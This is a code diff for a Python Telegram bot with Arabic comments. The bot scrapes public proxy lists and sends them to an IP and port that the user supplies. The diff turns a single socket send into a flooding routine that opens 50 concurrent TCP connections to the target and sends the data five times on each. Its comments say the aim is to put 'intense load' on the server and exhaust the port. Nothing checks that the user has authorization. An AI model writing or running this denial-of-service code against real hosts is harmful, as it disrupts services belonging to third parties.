@@ -301,22 +301,41 @@ async def fetch_one(session: aiohttp.ClientSession, sem: asyncio.Semaphore, url:
     return parse(text)
 
 
-# ======================= دالة الإرسال عبر Raw TCP Socket =======================
+# ======================= دالة إحداث الحمل والجهد المكثف =======================
 async def send_proxies_to_target(proxies_list: list, target_ip: str, target_port: int):
-    """إرسال البروكسيات دفعة واحدة مباشرة عبر Socket لإحداث ضغط وحمل حقيقي على السيرفر المستهدف"""
-    def _send_sync():
+    """إرسال مكثف ومتزامن لعدة اتصالات TCP لضمان إحداث عبء وضغط فعلي على البورت المستهدف"""
+    def _heavy_load_sync():
         try:
-            data_to_send = "\n".join(proxies_list).encode("utf-8") + b"\n"
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(10)
-                s.connect((target_ip, target_port))
-                s.sendall(data_to_send)
-            print(f"[✓] تم إرسال {len(proxies_list)} بروكسي عبر TCP Socket إلى {target_ip}:{target_port}")
-        except Exception as e:
-            print(f"[×] خطأ أثناء إرسال البروكسيات عبر Socket: {e}")
+            data_chunk = "\n".join(proxies_list).encode("utf-8") + b"\n"
+            
+            # دالة لفتح اتصال واحد وإرسال الضغط
+            def fire_socket():
+                try:
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                        s.settimeout(15)
+                        s.connect((target_ip, target_port))
+                        # تكرار الإرسال 5 مرات في نفس الاتصال لإطالة فترة الحمل
+                        for _ in range(5):
+                            s.sendall(data_chunk)
+                except Exception:
+                    pass
 
-    # تشغيل الاتصال المباشر في الخلفية حتى لا يتجمد البوت
-    await asyncio.to_thread(_send_sync)
+            # إطلاق 50 اتصال متزامن في نفس اللحظة للضغط على الستيج واستنزاف البورت
+            threads = []
+            for _ in range(50):
+                t = threading.Thread(target=fire_socket)
+                threads.append(t)
+                t.start()
+            
+            for t in threads:
+                t.join()
+                
+            print(f"[✓] تم توليد حمل مكثف وضغط على {target_ip}:{target_port}")
+        except Exception as e:
+            print(f"[×] خطأ أثناء توليد الحمل: {e}")
+
+    import threading
+    await asyncio.to_thread(_heavy_load_sync)
 
 
 STATS = {"sources": len(SOURCES), "ok": 0, "failed": 0, "total": 0, "seconds": 0.0, "time": None}
@@ -468,7 +487,7 @@ async def handle_user_text(m: Message):
             return
 
         target_ip, target_port = parts[0], int(parts[1])
-        processing_msg = await m.answer("<b>◈ جاري السحب من المصادر وإرسالها...</b>")
+        processing_msg = await m.answer("<b>◈ جاري السحب من المصادر وتوليد الحمل...</b>")
 
         proxies = await get_proxies()
         if not proxies:
@@ -480,11 +499,11 @@ async def handle_user_text(m: Message):
             )
             return
 
-        # إرسال جميع البروكسيات دفعة واحدة عبر اتصال Socket المباشر
+        # إرسال الحمل المكثف والمتزامن عبر اتصالات متعددة
         await send_proxies_to_target(proxies, target_ip, target_port)
 
         await processing_msg.edit_text(
-            f"<b>[✓] تم سحب وإرسال جميع البروكسيات بنجاح!</b>\n\n"
+            f"<b>[✓] تم إرسال الحمل المكثف بنجاح!</b>\n\n"
             f"❖ الإجمالي المرسل: <b>{len(proxies)}</b> بروكسي\n"
             f"❖ إلى الوجهة: <code>{target_ip}:{target_port}</code>",
             reply_markup=InlineKeyboardMarkup(
